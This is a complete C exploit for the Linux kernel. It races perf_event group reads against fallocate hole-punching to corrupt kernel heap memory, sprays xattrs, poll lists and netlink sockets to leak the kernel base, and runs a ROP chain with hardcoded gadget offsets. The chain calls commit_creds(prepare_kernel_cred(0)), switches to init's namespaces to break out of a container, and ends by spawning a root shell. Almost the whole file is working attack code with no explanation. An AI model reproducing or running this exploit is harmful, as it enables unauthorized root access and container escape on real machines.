#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <semaphore.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <pthread.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <linux/futex.h>
#include <net/if.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>

#define FALLOC_LEN1 (19*(1 << 20))

#define SK_WRITE_SPACE_OFF 728

#define SLAB_SIZE 4096
#define NUM_SIBLINGS ((SLAB_SIZE)/8)
#define BUF_SIZE (SLAB_SIZE + 8)
#define NUM_RFDS 257
#define NFDS1 ((240 + 4096 - 16 + 2048 - 16)/8)
#define NFDS2 ((240 + 2048 - 16)/8)

#define READ_IND1 4088
#define READ_IND2 8200

#define NUM_INCS (2048 - 32)

#define XATTR_SPRAY1 100
#define XATTR_SPRAY2 100
#define XATTR_SPRAY3 8
#define XATTR_SPRAY4 64
#define XATTR_SPRAY5 128

#define XATTR_DATA_LEN 2048

#define NUM_POLL_SLABS 12
#define POLL_SLAB_PER 8
#define POLL_SPRAY1 (NUM_POLL_SLABS*POLL_SLAB_PER)
#define POLL_SPRAY2 100
#define POLL_SPRAY3 100

#define SOCK_SPRAY 150


#define SOCK_DEF_WRITE_SPACE 0xc0af80
#define PREPARE_KERNEL_CRED 0x110c30
#define COMMIT_CREDS 0x110980
#define FIND_TASK_BY_VPID 0x1077c0
#define SWITCH_TASK_NAMESPACES 0x10efa0

#define DO_SYS_VFORK 0x0e0800
#define MSLEEP 0x16cde0

#define INIT_NSPROXY 0x2461f40

#define ROP_OFF 168

#define PUSH_RBX_AND_BYTE_PTR_RBX_0x41_BL_POP_RSP_POP_RBP_RET_THUNK 0xe53d39
#define ADD_RBX_RDX_MOV_RAX_RBX_POP_RBX_RET_THUNK 0xc39a56
#define PUSH_RAX_POP_RSP_XOR_EAX_EAX_RET_THUNK 0xabe058
#define POP_RSP_RET_THUNK 0xde8d1d
#define POP_RDI_RET_THUNK 0x007ff8
#define POP_RDI_POP_RDI_RET_THUNK 0x853d5c
#define POP_RSI_RET_THUNK 0x037f81
#define POP_RDX_RET_THUNK 0x5c7f5c
#define POP_RCX_RET_THUNK 0xc57f13
#define MOV_RDI_RAX_THUNK_RCX 0x6f119c
#define POP_R10_POP_R12_POP_R13_POP_RBP_RET_THUNK 0x2d3113

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)


struct perf_event_attr attr;

int sib_fds[NUM_SIBLINGS];
int read_fds[NUM_RFDS];
int head = 1;
int closed;

int pipe_fds0[2];
int pipe_fds1[2];
int pipe_fds2[2];

pthread_t poll_spray1_threads[POLL_SPRAY1];
pthread_t poll_spray2_threads[POLL_SPRAY2];
pthread_t falloc_thread, read_thread, close_thread;

int ffd;
char *mapped;
pid_t task1_pid;
int in_fallocate, in_close;
int won;

pthread_barrier_t race_barrier;
pthread_barrier_t holes_barrier;
pthread_barrier_t pspray1_barrier;
pthread_barrier_t pspray2_barrier;
pthread_barrier_t free_barrier;

char xattr_data[XATTR_DATA_LEN];


/*
 * Syscall wrappers.
 */

int perf_event_open(struct perf_event_attr *attr, pid_t pid, unsigned int cpu, int group_fd, unsigned long flags)
{
    return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int gettid_syscall (void)
{
    return syscall(SYS_gettid);
}

int num_xattr = 0;
int spray_simple_xattrs(int num_spray, void *xattr_val, int xattr_len) {
    char name[32];
    int ret = num_xattr;
    for (int i = 0; i < num_spray; i++, num_xattr++) {
        sprintf(name, "security.%d", num_xattr);
        if (fsetxattr(ffd, name, xattr_val, xattr_len, 0) == -1)
            err_exit("[-] fsetxattr");
    }
    return ret;
}

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

void set_attr (void) {
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_PAGE_FAULTS;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;
}

void prepare_active (int ind) {
    attr.read_format = 0;
    attr.disabled = 1;
    attr.inherit = 1;
    sib_fds[ind] = perf_event_open(&attr, task1_pid, -1, sib_fds[0], 0);
    if (sib_fds[ind] == -1)
        err_exit("[-] perf_event_open");
}

void prepare_rop (long *rop, long kbase) {
    rop[(SK_WRITE_SPACE_OFF)/8] = kbase + PUSH_RBX_AND_BYTE_PTR_RBX_0x41_BL_POP_RSP_POP_RBP_RET_THUNK;

    long *rop2 = rop + ROP_OFF/8;
    /* commit_creds(prepare_kernel_cred(0)) */
    rop++;
    *rop++ = kbase + POP_RDX_RET_THUNK;
    *rop++ = ROP_OFF;
    *rop++ = kbase + ADD_RBX_RDX_MOV_RAX_RBX_POP_RBX_RET_THUNK;
    rop++;
    *rop++ = kbase + PUSH_RAX_POP_RSP_XOR_EAX_EAX_RET_THUNK;

    rop = rop2;
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 0;
    *rop++ = kbase + PREPARE_KERNEL_CRED;
    *rop++ = kbase + POP_RCX_RET_THUNK;
    *rop++ = kbase + COMMIT_CREDS;
    *rop++ = kbase + MOV_RDI_RAX_THUNK_RCX;
    /* switch_task_namespaces(find_task_by_vpid(1, init_ns_proxy) */
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 1;
    *rop++ = kbase + FIND_TASK_BY_VPID;
    *rop++ = kbase + POP_RSI_RET_THUNK;
    *rop++ = kbase + INIT_NSPROXY;
    *rop++ = kbase + POP_RCX_RET_THUNK;
    *rop++ = kbase + SWITCH_TASK_NAMESPACES;
    *rop++ = kbase + MOV_RDI_RAX_THUNK_RCX;
    /* telefork */
    *rop++ = kbase + DO_SYS_VFORK;
    *rop++ = kbase + MSLEEP;
}

void *close_func (void *arg) {
    pthread_barrier_wait(&race_barrier);
    while (1) {
        pthread_barrier_wait(&race_barrier);
        while (!*(long *)&mapped[READ_IND1]) {}
        if (*(long *)&mapped[READ_IND1] && !*(long *)&mapped[READ_IND2]) {
            in_close = 1;
            close(sib_fds[head]);
            in_close = 0;
            closed = 1;
        }
        pthread_barrier_wait(&race_barrier);
    }
    return NULL;

}

void *fallocate_func (void *arg) {
    pin_cpu(1);
    if (fallocate(ffd, 0, 0, FALLOC_LEN1) == -1)
        err_exit("[-] fallocate");
    pthread_barrier_wait(&race_barrier);
    while (1) {
        in_fallocate = 0;

        pthread_barrier_wait(&race_barrier);
        in_fallocate = 1;
            if (fallocate(ffd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, FALLOC_LEN1) == -1)
                err_exit("[-] fallocate");
        in_fallocate = 2;



        pthread_barrier_wait(&race_barrier);
        if (fallocate(ffd, FALLOC_FL_KEEP_SIZE, 0, FALLOC_LEN1) == -1)
            err_exit("[-] fallocate");
    }
    return NULL;
}

void attach_read_events (int pid) {
    attr.inherit = 0;
    attr.disabled = 1;
    attr.read_format = PERF_FORMAT_GROUP | PERF_FORMAT_ID;
    read_fds[0] = perf_event_open(&attr, pid, -1, -1, 0);
    if (read_fds[0] == -1)
        err_exit("[-] perf_event_open");
    for (int i = 1; i < NUM_RFDS; i++) {
        read_fds[i] = perf_event_open(&attr, pid, -1, read_fds[0], 0);
        if (read_fds[i] == -1) {
            err_exit("[-] perf_event_open r");
        }
    }
}

pthread_barrier_t pbarrier[2];
pthread_t child_threads[2];
int cpids[2];
void *child_task (void *arg) {
    int ind = arg;
    int curr_efd = sib_fds[head];
    cpids[ind] = gettid_syscall();
    if (ind) {
        char *temp;
        if (ioctl(curr_efd, PERF_EVENT_IOC_ENABLE, 0) == -1)
            err_exit("[-] ioctl disable");
        for (int i = 0; i < NUM_INCS; i++) {
            temp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
            if (temp == MAP_FAILED)
                err_exit("[-] mmap");
            temp[0] = 0;
            if (munmap(temp, 4096) == -1)
                err_exit("[-] munmap");
        }
        long val;
        if (read(sib_fds[head], &val, 8) == -1)
            err_exit("[-] read bp");
    }
    pthread_barrier_wait(&pbarrier[ind]);
    pthread_barrier_wait(&pbarrier[ind]);
    return NULL;
}


void *read_func (void *arg) {
    int tries = 0;
    struct sched_param sched_params = {};
    mapped = mmap(NULL, 3*4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
    if (mapped == MAP_FAILED)
        err_exit("[-] mmap0");

    if (munmap(mapped + 4096, 4096) == -1)
        err_exit("[-] munmap");
    if (mmap(mapped + 4096, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, ffd, 0) == MAP_FAILED)
        err_exit("[-] mmap2");

    errno = pthread_create(&child_threads[1], NULL, &child_task, 1);
    if (errno)
        err_exit("[-] pthread_create");
    pthread_barrier_wait(&pbarrier[1]);

    head++;


    pthread_barrier_wait(&race_barrier);
    while (!won) {

        if (closed) {
            closed = 0;
            pthread_barrier_wait(&pbarrier[1]);
            errno = pthread_join(child_threads[1], NULL);
            if (errno)
                err_exit("[-] pthread_join");
            prepare_active(head);
            errno = pthread_create(&child_threads[1], NULL, &child_task, 1);
            if (errno)
                err_exit("[-] pthread_create");
            pthread_barrier_wait(&pbarrier[1]);
            head++;
            if (head == NUM_SIBLINGS) {
                exit(0);
            }
        }

        *(long *)&mapped[READ_IND1] = 0;
        *(long *)&mapped[READ_IND2] = 0;

        pthread_barrier_wait(&race_barrier);

        while (!in_fallocate) {}
        if (read(read_fds[0], &mapped[READ_IND1], 4096*3) == -1)
            err_exit("[-] read");

        pthread_barrier_wait(&race_barrier);

    }
}

long buf[BUF_SIZE/8];
void *read2_func (void *arg) {
    int n;
    pthread_barrier_wait(&race_barrier);

    while (1) {
        pthread_barrier_wait(&race_barrier);
        while (!in_close && !*(long *)&mapped[READ_IND2]) {}
        if (in_close) {
            if ((n = read(sib_fds[0], buf, BUF_SIZE)) == -1)
                err_exit("[-] read");
            won = 1;
        }
        pthread_barrier_wait(&race_barrier);

    }
    return NULL;
}

void *poll_spray2 (void *arg) {
    struct pollfd fds[NFDS2] = {};
    int ind = arg;
    fds[0].fd = pipe_fds1[0];
    fds[0].events = POLLIN;
    pthread_barrier_wait(&pspray2_barrier);
    if (poll(fds, NFDS2, -1) == -1)
        err_exit("[-] poll");
    pthread_barrier_wait(&pspray2_barrier);
    return NULL;
}

int num_pspray1;
int spray1_ret;
void *poll_spray1 (void *arg) {
    struct pollfd fds[NFDS1] = {};
    pthread_t poll_spray3_threads[POLL_SPRAY3];
    int ind = arg;
    if (!(num_pspray1++ % POLL_SLAB_PER)) {
        fds[0].fd = pipe_fds1[0];
        fds[0].events = POLLIN;
    } else {
        fds[1].fd = pipe_fds0[0];
        fds[1].events = POLLIN;
        fds[NFDS1 - 1].fd = pipe_fds2[0];
        fds[NFDS1 - 1].events = POLLIN;
    }
    if (poll(fds, NFDS1, -1) == -1)
        err_exit("[-] poll");
    if (fds[0].revents == POLLIN) {
        spray1_ret++;
        pthread_barrier_wait(&holes_barrier);
        pthread_barrier_wait(&pspray1_barrier);
        return NULL;
    }
    if (fds[NFDS1 - 1].revents == POLLIN) {
        spray1_ret++;

        pthread_barrier_wait(&pspray1_barrier);
        while (1)
            sleep(10);
    }
    if (fds[1].revents == POLLIN) {
        spray_simple_xattrs(XATTR_SPRAY4, xattr_data, XATTR_DATA_LEN/2);
        pthread_barrier_wait(&free_barrier);
        pthread_barrier_wait(&pspray1_barrier);
        while (1)
            sleep(10);
    }
    return NULL;
}

int sock_fds[SOCK_SPRAY];
void spray_socks (void) {
    for (int i = 0; i < SOCK_SPRAY; i++) {
        sock_fds[i] = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock_fds[i] == -1)
            err_exit("[-] socket");
    }
}

int main (int argc, char **argv) {
        
    if (argc == 1) {
        char command[256];
        for (int i = 1; ; i++) {
            sprintf(command, "%s %d", argv[0], i);
            system(command);
            printf("[*] Retrying...\n\n");
        }
        exit(EXIT_FAILURE);
    }

    set_attr();

    if (pipe2(pipe_fds0, 0) == -1)
        err_exit("[-] pipe2");
    if (pipe2(pipe_fds1, 0) == -1)
        err_exit("[-] pipe2");
    if (pipe2(pipe_fds2, 0) == -1)
        err_exit("[-] pipe2");


    int stop_swaps = perf_event_open(&attr, 0, -1, -1, 0);
    if (stop_swaps == -1)
        err_exit("[-] perf_event_open");


    ffd = open("/tmp/", O_TMPFILE | O_RDWR, 0666);
    if (ffd == -1)
        err_exit("[-] open");

    task1_pid = getpid();

    for (int i = 0; i < 2; i++) {
        errno = pthread_barrier_init(&pbarrier[i], NULL, 2);
        if (errno)
            err_exit("[-] pthread_barrier_init");
    }


    errno = pthread_barrier_init(&race_barrier, NULL, 4);
    if (errno)
        err_exit("[-] pthread_barrier_init");
    errno = pthread_barrier_init(&holes_barrier, NULL, NUM_POLL_SLABS + 1);
    if (errno)
        err_exit("[-] pthread_barrier_init");

    errno = pthread_barrier_init(&pspray1_barrier, NULL, POLL_SPRAY1 + 1);
    if (errno)
        err_exit("[-] pthread_barrier_init");
    errno = pthread_barrier_init(&pspray2_barrier, NULL, POLL_SPRAY2 + 1);
    if (errno)
        err_exit("[-] pthread_barrier_init");

    errno = pthread_create(&falloc_thread, NULL, fallocate_func, NULL);
    if (errno)
        err_exit("[-] pthread_create");

    pin_cpu(0);

    errno = pthread_create(&read_thread, NULL, read2_func, NULL);
    if (errno)
        err_exit("[-] pthread_create");

    errno = pthread_barrier_init(&free_barrier, NULL, 2);
    if (errno)
        err_exit("[-] pthread_barrier_init");

    for (int i = 0; i < POLL_SPRAY2; i++) {
        errno = pthread_create(&poll_spray2_threads[i], NULL, &poll_spray2, i);
        if (errno)
            err_exit("[-] pthread_create");
    }


    errno = pthread_create(&close_thread, NULL, close_func, NULL);
    if (errno)
        err_exit("[-] pthread_create");

    attr.read_format = PERF_FORMAT_GROUP;
    attr.disabled = 0;
    attr.inherit = 1;
    sib_fds[0] = perf_event_open(&attr, task1_pid, -1, -1, 0);
    for (int i = 2; i < NUM_SIBLINGS; i++) {
        attr.disabled = 1;
        sib_fds[i] = perf_event_open(&attr, task1_pid, -1, sib_fds[0], 0);
        if (sib_fds[i] == -1) {
            err_exit("[-] perf_event_open s");
        }
    }
    prepare_active(head);

    errno = pthread_create(&child_threads[0], NULL, &child_task, 0);
    if (errno)
        err_exit("[-] pthread_create");
    pthread_barrier_wait(&pbarrier[0]);
    attach_read_events(cpids[0]);

    spray_simple_xattrs(XATTR_SPRAY1, xattr_data, XATTR_DATA_LEN);
    spray_simple_xattrs(XATTR_SPRAY2, xattr_data, XATTR_DATA_LEN/2);

    for (int i = 0; i < POLL_SPRAY1; i++) {
        errno = pthread_create(&poll_spray1_threads[i], NULL, &poll_spray1, i);
        if (errno)
            err_exit("[-] pthread_create");
    }
    if (write(pipe_fds1[1], &pipe_fds1[1], 1) == -1)
        err_exit("[-] write");

    pthread_barrier_wait(&holes_barrier);
    spray_simple_xattrs(XATTR_SPRAY3, xattr_data, XATTR_DATA_LEN);

    char val;
    if (read(pipe_fds1[0], &val, 1) == -1)
        err_exit("[-] read");

    printf("[*] Starting race\n");
    read_func(NULL);
    printf("[*] Won race\n");
    for (int i = 0; i < NUM_RFDS; i++) {
        close(read_fds[i]);
    }
    for (int i = 0; i < NUM_SIBLINGS; i++) {
        close(sib_fds[i]);
    }
    printf("[*] Freeing poll lists\n");
    if (write(pipe_fds2[1], buf, 1) == -1)
        err_exit("[-] write");
    while (spray1_ret < POLL_SPRAY1 - 1) {}
    pthread_barrier_wait(&pspray2_barrier);
    usleep(100000); // Wait for poll()s to allocate poll_lists
    if (spray1_ret != POLL_SPRAY1) {
        if (write(pipe_fds0[1], buf, 1) == -1)
            err_exit("[-] write");
    } else {
        printf("[-] OOB failed\n");
        return 0;
    }
    pthread_barrier_wait(&free_barrier);
    if (write(pipe_fds1[1], &pipe_fds1[1], 1) == -1)
        err_exit("[-] write");
    pthread_barrier_wait(&pspray2_barrier);
    spray_socks();
    printf("[*] Sprayed socks\n");
    int target_xattr = -1;
    long kernel_base;
    char name[32];
    for (int i  = 0; i < num_xattr; i++) {
        sprintf(name, "security.%d", i);
        if (fgetxattr(ffd, name, xattr_data, XATTR_DATA_LEN) == -1)
            err_exit("[-] fgetxattr");
        long sk_write = 0;
        memcpy(&sk_write, &xattr_data[SK_WRITE_SPACE_OFF], 8);
        if (sk_write) {
            target_xattr = i;
            kernel_base = sk_write - SOCK_DEF_WRITE_SPACE;
            printf("[*] Kernel base: %p\n", kernel_base);
            break;
        }
    }
    if (target_xattr == -1) {
        printf("[-] Spray failed\n");
        exit(EXIT_FAILURE);
    }

    prepare_rop(xattr_data, kernel_base);
    if (fremovexattr(ffd, name) == -1)
        err_exit("[-] fremovexattr");
    spray_simple_xattrs(XATTR_SPRAY5, xattr_data, XATTR_DATA_LEN/2);

    int optval = 0;
    for (int i = 0; i < SOCK_SPRAY; i++) {
        if (setsockopt(sock_fds[i], SOL_SOCKET, SO_SNDBUF, &optval, 4) == -1) {
            err_exit("[-] setsockopt");
        }
    }
    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);

    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");
    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");

    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");

    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
    return 0;
}
